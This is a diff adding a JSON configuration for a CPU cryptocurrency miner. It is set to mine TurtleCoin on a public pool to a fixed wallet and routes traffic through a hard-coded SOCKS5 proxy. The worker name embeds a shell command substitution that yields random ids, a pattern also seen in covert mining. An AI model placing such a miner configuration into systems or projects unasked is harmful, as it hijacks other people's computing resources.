@@ -1,0 +1,19 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": null,
+            "algo": "argon2/chukwav2",
+            "url": "us.turtlecoin.herominers.com:1160",
+            "user": "TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+c037b19a3aa6a885347281f5b522c65756b16ba52cc7c8337575070247130c1f.$(shuf -i 1000-9999 -n 1)",
+            "pass": "x",
+            "socks5": "socks5://192.111.138.29:4145",
+            "tls": false,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
